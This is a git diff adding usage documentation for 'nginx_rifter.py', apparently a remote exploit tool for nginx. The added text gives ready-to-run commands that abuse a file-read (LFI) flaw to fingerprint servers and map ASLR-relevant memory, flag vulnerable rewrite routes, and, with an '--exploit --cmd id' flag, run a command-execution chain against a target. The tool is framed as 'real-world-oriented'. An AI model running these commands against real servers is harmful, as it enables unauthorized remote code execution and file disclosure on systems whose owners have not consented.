@@ -88,6 +88,27 @@ ASLR-enabled VM research chain:
   --tries-per-candidate 1 --max-core-hits 100
 ```
 
+Assessment-first v2 tool:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321
+```
+
+`nginx_rifter.py` is the current real-world-oriented assessor. Its default mode does not run the crashing exploit path. It profiles the HTTP file-read primitive, checks ranged and binary reads, fingerprints OS/nginx/libc, discovers nginx workers and ASLR-relevant maps, tries to recover nginx config paths through pid/cmdline/config reads, flags vulnerable `rewrite` + `set` route candidates, and prints a viability matrix for the current core-guided chain.
+
+For a custom LFI/download shape:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 \
+  --file-read-template 'http://{host}:{port}/download?path={path_url}{range_query}'
+```
+
+Exploit execution is explicit:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 --exploit --cmd id --fast
+```
+
 Recording-friendly terminal demo:
 
 ```bash
